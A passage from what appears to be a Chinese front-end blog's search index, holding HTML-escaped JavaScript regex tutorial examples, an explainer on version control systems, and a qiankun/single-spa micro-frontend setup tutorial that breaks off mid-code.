/[0-9]/;// 匹配有没有数字            \tvar reg = /\\d/;// \\d 表示[0-9]            \talert(reg.test(cv));            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /[A-Z]/;// 匹配有没有数字            \talert(reg.test(cv));            &#125;            function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /[^0-9]/;// 匹配非数字 0-9之外的字符  对于网上发布手机号之类的很有用 比如1300 把00换成OO 就没法认出            \tif(reg.test(cv))&#123;            \t\talert(&#x27;有非数字存在&#x27;);            \t&#125;else&#123;            \t\talert(&#x27;全是数字&#x27;);            \t&#125;            &#125;\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.3 例3-从哪里开始匹配\n在线演示 https://codepen.io/poetries/pen/jzdVOo\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;74-从哪里开始匹配&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px;\t\t\t\t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配hi&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配hi开头及hi开头的单词&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配hi开头的单词但不是hi&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配进行时的单词&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配un前缀的反义词&quot; onclick=&quot;t5();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配单词中间的hi部分&quot; onclick=&quot;t6();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配输入的名字是不是lisi&quot; onclick=&quot;t7();&quot;&gt;&lt;/p&gt;\t\t\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /hi/;//仅仅是看字符串中有没有hi            \talert(reg.test(cv));//满足 返回true  不满足 返回false            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \t//var reg = /\\bhi.+/;// 错误1 匹配hi开头的单词            \t////var reg = /\\bhi\\w+/;// 错误2            \tvar reg = /\\bhi\\w*/;             \talert(reg.exec(cv));//exec返回一个对象  没找到返回none            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\bhi/;//正则测试hi开头的单词但不是hi            \talert(reg.exec(cv));//exec返回一个对象  没找到返回none            &#125;             function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\b[\\w]+ing\\b/;//*表示匹配0-无穷  +表示匹配1-无穷            \talert(reg.exec(cv));            &#125;             function t5()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\bun[\\w]+\\b/;//匹配un前缀的反义词            \talert(reg.exec(cv));            &#125;            function t6()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\Bhi\\B/;//匹配单词中间的hi部分            \talert(reg.exec(cv));            &#125;            function t7()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /^lisi$/;//匹配输入的名字是不是lisi            \talert(reg.exec(cv));            &#125;\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.4 例4 正则应用字符串\n在线演示 https://codepen.io/poetries/pen/dmaOPz\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;正则应用字符串&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px; \t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;查找中间含有hi的单词&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;查找所有中间含有hi的单词&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;查找所有中间含有hi的单词，不区分大小写&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;替换JavaScript标签&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;把连接换成空连接&quot; onclick=&quot;t5();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;把每一行的结尾的数字换成#&quot; onclick=&quot;t6();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;替换goods中多余的O&quot; onclick=&quot;t7();&quot;&gt;&lt;/p&gt;    &lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\Bhi\\B/;//查找中间含有hi的单词            \talert(cv.match(reg));            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\Bhi\\B/g;//查找所有中间含有hi的单词            \talert(cv.match(reg));            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\Bhi\\B/gi;//查找所有中间含有hi的单词  g是全局 i ignore 忽略大小写            \talert(cv.match(reg));            &#125;            function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar  reg = /&lt;script.*&lt;\\/script&gt;/;//替换JavaScript标签            \talert(cv.replace(reg,&#x27;哈哈哈&#x27;));            &#125;            function t5()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \t  /*                        . 代表任意,但不包括换行                        可以用一对反义词来匹配所有. \\d\\D等                        不能跨行（贪婪模式）                  */                             \tvar reg = /&lt;a[\\s]+[\\d\\D]*&lt;\\/a&gt;/; //正则替换链接                    alert(cv.replace(reg,&#x27;&lt;a href=&quot;#&quot;&gt;文字&lt;/a&gt;&#x27;));             &#125;            function t6()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar  reg = /\\d+$/gm;//把每一行的结尾的数字换成#   m 多行模式            \talert(cv.replace(reg,&#x27;#&#x27;));            &#125;            function t7()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar  reg = /go&#123;3,&#125;?ds/;//替换goods中多余的O            \talert(cv.replace(reg,&#x27;goods&#x27;));            &#125;\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.5 例5-预查\n在线演示 https://codepen.io/poetries/pen/MVLbwW\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;预查&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px; \t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配进行时的单词&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;匹配进行时的单词的词根部分,正向预查&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;查找winxp,负向预查&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;找出un*系列单词的词根&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\b[\\w]+ing\\b/;            \talert(cv.match(reg));            &#125;             function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\b[\\w]+(?=ing)/g;//匹配进行时的单词的词根部分  不要ing结尾  预查不消耗字符            \talert(cv.match(reg));            &#125;             function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\bwin(?!95)/g;//win98 win97 win95 win32 winxp win2003要求把win95过滤            \talert(cv.match(reg));            &#125;             function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \t//var reg = /\\w+(?&lt;=un)/g;//找出un*系列单词的词根  js不支持向前正向预查            \talert(cv.match(reg));            &#125;  \t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.6 例6-反向引用\n在线演示 https://codepen.io/poetries/pen/LdqbVL\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;反向引用&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px; \t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;把连接换成空连接，保留文字&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /&lt;a[\\s]+[^&gt;]+&gt;([^&lt;&gt;]+)&lt;\\/a&gt;/; //链接表达式  这个一部分是子表达式 ([^&lt;&gt;]+)                    // alert(reg.exec(cv));                                     alert(cv.replace(reg,&#x27;&lt;a href=&quot;#&quot;&quot;&gt;$1&lt;/a&gt;&#x27;));            &#125;\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.7 例7-正则练习\n在线演示 https://codepen.io/poetries/pen/dmaOYV\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;正则练习&lt;/title&gt;\t&lt;style type=&quot;text/css&quot;&gt;\t\ttextarea&#123;\t\t\twidth: 400px;\t\t\theight: 200px; \t\t&#125;\t&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;1-找首尾相同的单词&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;2-手机号第4位到第七位换成*&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;3-统一空格&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;4-把名字中的,去掉&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;5-把aaabb换成ab&quot; onclick=&quot;t5();&quot;&gt;&lt;/p&gt;        &lt;script type=&quot;text/javascript&quot;&gt;           function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /\\b([\\w])[\\w]*\\1\\b/g;// \\1注意引用方式 [\\w]任意一个 [\\w]*任意多个 找首尾相同的单词            \t/**            \t *  *如何引用子表达式所匹配的结果？             *             * 答： 在表达式内部 反向引用时 \\n来匹配第N个子表达式的结果 子表达式当成变量来传递时，$N来匹配第N个子表达式的匹配结果             *             \t */            \talert(cv.match(reg));            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /(1(3|5|8|)\\d)\\d&#123;4&#125;(\\d&#123;4&#125;)/;//字表达式(3|5|8|)  (\\d&#123;4&#125;)  &#123;4&#125;代表任意4个              \t// alert(cv.match(reg));//打印结果18878553070，188，3070            \talert(cv.replace(reg,&#x27;$1****$3&#x27;));//188****4070            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /[ \\t\\u3000]+/g;//找空白符  第一个是半角的空格  \\s包含所有空白符  \\u3000表示 全角空格的16进制Unicode编码            \talert(cv.replace(reg,&#x27;,&#x27;));//            &#125;            function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            var reg = /([\\u4E00-\\u9FA0]),([\\u4E00-\\u9FA0])/g;  // 找中文用Unicode编码表的中文范围            \talert(cv.replace(reg,&#x27;,&#x27;));            &#125;            function t5()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            var reg = //;              \talert(cv.replace(reg,&#x27;,&#x27;));            &#125;\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n4.8 例8-常用正则\n在线演示 https://codepen.io/poetries/pen/GxzNoG\n\n&lt;html&gt;&lt;head&gt;\t&lt;meta charset=&quot;UTF-8&quot;&gt;\t&lt;title&gt;常用正则解答&lt;/title&gt;\t&lt;script type=&quot;text/javascript&quot;&gt;            function t1()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /(\\w)\\1+/g; //查找连续多个字符  把aaabbccdd换成abcd这个格式            \t\t\t\t\t\t/**\\1 后向引用，表示表达式中，从左往右数，第一个左括号对应的括号内的内容。            以此类推，\\2表示第二个，\\0表示整个表达式**/            \talert(cv.replace(reg,&#x27;$1&#x27;));            &#125;            function t2()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \t//手机号正则：            \t//1开头            \t//358第二位            \t//后九位            \tvar reg = /1[358]\\d&#123;9&#125;/g; // 这种情况适合在一段文本中分析出手机号            \talert(cv.match(reg));//分析手机号            &#125;            function t3()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /^1[358]\\d&#123;9&#125;$/g;            \talert(reg.test(cv));// test 验证手机号            &#125;            function t4()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /^\\s+|\\s+$/g; // | 并列 或者 去除两端空格            \talert(&#x27;--&#x27;+cv.replace(reg,&#x27;&#x27;)+&#x27;--&#x27;);            &#125;            //借助正则限制在一个有限范围内 防止sql注入            function t5()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /^[\\w\\u4E00-\\u9FA0]&#123;4,16&#125;$/; // \\u4E00-\\u9FA0 中文对应的Unicode编码 验证由字母数字下划线中文组合的4-16位用户名             \talert(reg.test(cv));            &#125;            function t6()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = /^[0-9a-zA-Z]\\w*(\\.[\\w]+)*@[0-9a-zA-Z\\-]+(\\.[\\w]+)+$/;            \talert(reg.test(cv));            &#125;            function t7()&#123;            \tvar cont = document.getElementById(&#x27;cont&#x27;);            \tvar cv = cont.value;            \tvar reg = //;            \talert(cv.replace(reg,&#x27;&#x27;));            &#125;\t&lt;/script&gt;&lt;/head&gt;&lt;body&gt;\t&lt;textarea id=&#x27;cont&#x27;&gt;&lt;/textarea&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;1-替换相同字符串&quot; onclick=&quot;t1();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;2-分析出手机号&quot; onclick=&quot;t2();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;3-验证手机号&quot; onclick=&quot;t3();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;4-去除两端空格&quot; onclick=&quot;t4();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;5-验证由字母数字下划线中文组合的4-16位用户名&quot; onclick=&quot;t5();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;6-验证邮箱&quot; onclick=&quot;t6();&quot;&gt;&lt;/p&gt;\t&lt;p&gt;&lt;input type=&quot;button&quot; value=&quot;7-清空script代码&quot; onclick=&quot;t7();&quot;&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n","categories":["正则表达式"],"tags":["正则表达式"]},{"title":"版本管理是什么","url":"/2018/11/13/%E5%B7%A5%E5%85%B7/%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88/","content":"一、是什么版本控制（Version control），是维护工程蓝图的标准作法，能追踪工程蓝图从诞生一直到定案的过程。此外，版本控制也是一种软件工程技巧，借此能在软件开发的过程中，确保由不同人所编辑的同一程序文件都得到同步\n透过文档控制，能记录任何工程项目内各个模块的改动历程，并为每次改动编上序号\n一种简单的版本控制形式如下：赋给图的初版一个版本等级“A”。当做了第一次改变后，版本等级改为“B”，以此类推\n版本控制能提供项目的设计者，将设计恢复到之前任一状态的选择权\n简言之，你的修改只要提到到版本控制系统，基本都可以找回，版本控制系统就像一台时光机器，可以让你回到任何一个时间点\n二、有哪些版本控制系统在当今的软件开发中，被认为是理所当然的配备工具之一，根据类别可以分成：\n\n本地版本控制系统\n集中式版本控制系统\n分布式版本控制系统\n\n本地版本控制系统结构如下图所示：\n\n优点：\n\n简单，很多系统中都有内置\n适合管理文本，如系统配置\n\n缺点：\n\n其不支持远程操作，因此并不适合多人版本开发\n\n集中式版本控制系统结构如下图所示：\n\n优点：\n\n适合多人团队协作开发\n代码集中化管理\n\n缺点：\n\n单点故障\n必须联网，无法单机工作\n\n代表工具有SVN、CVS：\nSVNTortoiseSVN是一款非常易于使用的跨平台的 版本控制&#x2F;版本控制&#x2F;源代码控制软件\nCVSCVS是版本控制系统，是源配置管理（SCM）的重要组成部分。使用它，您可以记录源文件和文档的历史记录\n老牌的版本控制系统，它是基于客户端&#x2F;服务器的行为使得其可容纳多用户，构成网络也很方便\n这一特性使得CVS成为位于不同地点的人同时处理数据文件（特别是程序的源代码）时的首选\n分布式版本控制系统结构如下图：\n\n优点：\n\n适合多人团队协作开发\n代码集中化管理\n可以离线工作\n每个计算机都是一个完整仓库\n\n分布式版本管理系统每个计算机都有一个完整的仓库，可本地提交，可以做到离线工作，则不用像集中管理那样因为断网情况而无法工作\n代表工具为Git、HG：\nGitGit是目前世界上最先进的分布式版本控制系统，旨在快速高效地处理从小型到大型项目的所有事务\n特性：易于学习，占用内存小，具有闪电般快速的性能\n使用Git和Gitlab搭建版本控制环境是现在互联网公司最流行的版本控制方式\nHGMercurial是一个免费的分布式源代码管理工具。它可以有效地处理任何规模的项目，并提供简单直观的界面\nMercurial是一种轻量级分布式版本控制系统，采用 Python语言实现，易于学习和使用，扩展性强\n三、总结版本控制系统的优点如下：\n\n记录文件所有历史变化，这是版本控制系统的基本能力\n随时恢复到任意时间点，历史记录功能使我们不怕改错代码了\n支持多功能并行开发，通常版本控制系统都支持分支，保证了并行开发的可行\n多人协作并行开发，对于多人协作项目，支持多人协作开发的版本管理将事半功倍\n\n","categories":["工具"],"tags":["git"]},{"title":"qiankun微前端","url":"/2022/04/12/%E5%BE%AE%E5%89%8D%E7%AB%AF/qiankun%E5%BE%AE%E5%89%8D%E7%AB%AF/","content":"微前端其实非常地简单，非常地容易落地，而且也非常不高大上~\n那么就来一起看看什么是微前端吧：\n一.为什么需要微前端?这里我们通过3W(what,why,how)的方式来讲解什么是微前端：\n1.What?什么是微前端?微前端就是将不同的功能按照不同的维度拆分成多个子应用。通过主应用来加载这些子应用。\n微前端的核心在于拆, 拆完后再合!\n2.Why?为什么去使用他?不同团队间开发同一个应用技术栈不同怎么破？希望每个团队都可以独立开发，独立部署怎么破？项目中还需要老的应用代码怎么破？我们是不是可以将一个应用划分成若干个子应用，再将子应用打包成一个个的lib呢？当路径切换时加载不同的子应用，这样每个子应用都是独立的，技术栈也就不用再做限制了！从而解决了前端协同开发的问题。\n3.How?怎样落地微前端?2018年 Single-SPA诞生了， single-spa是一个用于前端微服务化的JavaScript前端解决方案  (本身没有处理样式隔离、js执行隔离)  实现了路由劫持和应用加载；\n2019年 qiankun基于Single-SPA, 提供了更加开箱即用的 API  (single-spa + sandbox + import-html-entry)，它 做到了技术栈无关，并且接入简单(有多简单呢，像iframe一样简单)。\n总结：子应用可以独立构建，运行时动态加载，主子应用完全解耦，并且技术栈无关，靠的是协议接入(这里提前强调一下：子应用必须导出 bootstrap、mount、unmount三个方法)。\n这里先回答一下大家可能会有的疑问：这不是iframe吗？\n如果使用的是iframe，当iframe中的子应用切换路由时用户刷新页面就尴尬了。应用间如何通信？\n基于URL来进行数据传递，但是这种传递消息的方式能力较弱；\n基于CustomEvent实现通信；\n基于props主子应用间通信；\n使用全局变量、Redux进行通信。\n如何处理公共依赖？\nCDN - externals\nwebpack联邦模块\n二 .SingleSpa实战1.构建子应用首先创建一个vue子应用，并通过single-spa-vue来导出必要的生命周期：\nvue create spa-vue  npm install single-spa-vue  import singleSpaVue from &#x27;single-spa-vue&#x27;;const appOptions = &#123;   el: &#x27;#vue&#x27;,   router,   render: h =&gt; h(App)&#125;// 在非子应用中正常挂载应用if(!window.singleSpaNavigate)&#123; delete appOptions.el; new Vue(appOptions).$mount(&#x27;#app&#x27;);&#125;const vueLifeCycle = singleSpaVue(&#123;   Vue,   appOptions&#125;);// 子应用必须导出以下生命周期：bootstrap、mount、unmountexport const bootstrap = vueLifeCycle.bootstrap;export const mount = vueLifeCycle.mount;export const unmount = vueLifeCycle.unmount;export default vueLifeCycle;const router = new VueRouter(&#123;  mode: &#x27;history&#x27;,  base: &#x27;/vue&#x27;,   //改变路径配置  routes&#125;)配置子路由基础路径\n\n2.配置库打包//vue.config.jsmodule.exports = &#123;    configureWebpack: &#123;        output: &#123;            library: &#x27;singleVue&#x27;,            libraryTarget: &#x27;umd&#x27;        &#125;,        devServer:&#123;            port:10000        &#125;    &#125;&#125;\n\n\n将子模块打包成类库\n3.主应用搭建&lt;div id=&quot;nav&quot;&gt;    &lt;router-link to=&quot;/vue&quot;&gt;vue项目router-link&gt;     &lt;div id=&quot;vue&quot;&gt;div&gt;div&gt;\n\n将子应用挂载到id&#x3D;”vue”标签中\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import router from &#x27;./router&#x27;import ElementUI from &#x27;element-ui&#x27;;import &#x27;element-ui/lib/theme-chalk/index.css&#x27;;Vue.use(ElementUI);const loadScript = async (url)=&gt; &#123;  await new Promise((resolve,reject)=&gt;&#123;    const script = document.createElement(&#x27;script&#x27;);    script.src = url;    script.onload = resolve;    script.onerror = reject;    document.head.appendChild(script)  &#125;);&#125;import &#123; registerApplication, start &#125; from &#x27;single-spa&#x27;;registerApplication(    &#x27;singleVue&#x27;,    async ()=&gt;&#123;        //这里通过协议来加载指定文件        await loadScript(&#x27;http://localhost:10000/js/chunk-vendors.js&#x27;);        await loadScript(&#x27;http://localhost:10000/js/app.js&#x27;);        return window.singleVue    &#125;,    location =&gt; location.pathname.startsWith(&#x27;/vue&#x27;))start();new Vue(&#123;  router,  render: h =&gt; h(App)&#125;).$mount(&#x27;#app&#x27;)\n\n4.动态设置子应用publicPathif(window.singleSpaNavigate)&#123;  __webpack_public_path__ = &#x27;http://localhost:10000/&#x27;&#125;\n\n三.qiankun实战qiankun是目前比较完善的一个微前端解决方案，它已在蚂蚁内部经受过足够大量的项目考验及打磨，十分健壮。这里附上官网。\n1.主应用编写&lt;el-menu :router=&quot;true&quot; mode=&quot;horizontal&quot;&gt;    &lt;el-menu-item index=&quot;/&quot;&gt;首页el-menu-item&gt;    &lt;el-menu-item index=&quot;/vue&quot;&gt;vue应用el-menu-item&gt;    &lt;el-menu-item index=&quot;/react&quot;&gt;react应用el-menu-item&gt;el-menu&gt;&lt;router-view v-show=&quot;$route.name&quot;&gt;router-view&gt;&lt;div v-show=&quot;!$route.name&quot; id=&quot;vue&quot;&gt;div&gt;&lt;div v-show=&quot;!$route.name&quot; id=&quot;react&quot;&gt;div&gt;\n\n2.注册子应用import &#123;registerMicroApps,start&#125; from &#x27;qiankun&#x27;const apps = [  &#123;    name:&#x27;vueApp&#x27;,    entry:&#x27;//localhost:10000&#x27;,    container:&#x27;#vue&#x27;,    activeRule:&#x27;/vue&#x27;  &#125;,  &#123;    name:&#x27;reactApp&#x27;,    entry:&#x27;//localhost:20000&#x27;,    container:&#x27;#react&#x27;,    activeRule:&#x27;/react&#x27;  &#125;]registerMicroApps(apps);start();\n\n3.子Vue应用let instance = null;function render()&#123;  instance = new Vue(&#123;    router,    render: h =&gt; h(App)  &#125;).$mount(&#x27;#app&#x27;)&#125;if(window.__POWERED_BY_QIANKUN__)&#123;  __webpack_public_path__ = window.__INJECTED_PUBLIC_PATH_BY_QIANKUN__;&#125;if(!window.__POWERED_BY_QIANKUN__)&#123;render()&#125;export async function bootstrap()&#123;&#125;export async function mount(props)&#123;render();&#125;export async function unmount()&#123;instance.$destroy();&#125;\n\n这里不要忘记子应用的钩子导出。\nmodule.exports = &#123;    devServer:&#123;        port:10000,        headers:&#123;            &#x27;Access-Control-Allow-Origin&#x27;:&#x27;*&#x27; //允许访问跨域        &#125;    &#125;,    configureWebpack:&#123;        output:&#123;            library:&#x27;vueApp&#x27;,            libraryTarget:&#x27;umd&#x27;        &#125;    &#125;&#125;\n\n4.子React应用再起一个子应用，为了表明技术栈无关特性，这里使用了一个React项目：\nimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import &#x27;./index.css&#x27;;import App from &#x27;./App&#x27;;function render() &#123;  ReactDOM.render(    &lt;React.StrictMode&gt;&lt;App /&gt;React.StrictMode&gt;,    document.getElementById(&#x27;root&#x27;)  );&#125;if(!window.__POWERED_BY_QIANKUN__)&#123;  render()&#125;export async function bootstrap() &#123;&#125;export async function mount() &#123;render();&#125;export async function unmount() &#123;  ReactDOM.unmountComponentAtNode(document.getElementById(&quot;root&quot;));&#125;\n\n重写react中的webpack配置文件 (config-overrides.js)\n&#96;&#96;&#96;&#96;yarn add react-app-rewired –save-dev\n\nmodule.exports &#x3D; {  webpack: (config) &#x3D;&gt; {    config.output.library &#x3D; reactApp;    config.output.libraryTarget &#x3D; “umd”;    config.output.publicPath &#x3D; ‘http://localhost:20000/&#39;    return config  },  devServer: function (configFunction) {    return function (proxy, allowedHost) {      const config &#x3D; configFunction(proxy, allowedHost);      config.headers &#x3D; {        “Access-Control-Allow-Origin”: “*”,      };      return config;    };  },};\n配置.env文件\nPORT&#x3D;20000WDS_SOCKET_PORT&#x3D;20000\nReact路由配置\nimport { BrowserRouter, Route, Link } from “react-router-dom”const BASE_NAME &#x3D; window.POWERED_BY_QIANKUN ? “&#x2F;react” : “”;function App() {  return (    首页Link&gt;关于Link&gt;&lt;Route path&#x3D;”&#x2F;“ exact render&#x3D;{() &#x3D;&gt; hello homeh1&gt;}&gt;Route&gt;&lt;Route path&#x3D;”&#x2F;about” render&#x3D;{() &#x3D;&gt; hello abouth1&gt;}&gt;Route&gt;BrowserRouter&gt;  );}\n## 四.CSS隔离方案### 子应用之间样式隔离：Dynamic Stylesheet动态样式表，当应用切换时移除掉老应用样式，再添加新应用样式，保证在一个时间点内只有一个应用的样式表生效### 主应用和子应用之间的样式隔离：BEM(Block Element Modifier)  约定项目前缀CSS-Modules 打包时生成不冲突的选择器名Shadow DOM 真正意义上的隔离css-in-js\nlet shadowDom &#x3D; shadow.attachShadow({ mode: ‘open’ }); &#x2F;&#x2F; open&#x2F;close设置可否从外部获取let pElement &#x3D; document.createElement(‘p’);pElement.innerHTML &#x3D; ‘hello world’;let styleElement &#x3D; document.createElement(‘style’);styleElement.textContent &#x3D;   p&#123;color:red&#125;shadowDom.appendChild(pElement);shadowDom.appendChild(styleElement)\n&#96;&#96;&#96;\nshadow DOM 内部的元素始终不会影响到它的外部元素，可以实现真正意义上的隔离\n五.JS沙箱机制当运行子应用时应该跑在内部沙箱环境中\n快照沙箱，当应用沙箱挂载或卸载时记录快照，在切换时依据快照恢复环境 (无法支持多实例)Proxy 代理沙箱，不影响全局环境\n1.快照沙箱1.激活时将当前window属性进行快照处理\n2.失活时用快照中的内容和当前window属性比对\n3.如果属性发生变化保存到modifyPropsMap中，并用快照还原window属性\n4.再次激活时，再次进行快照，并用上次修改的结果还原window属性\nclass 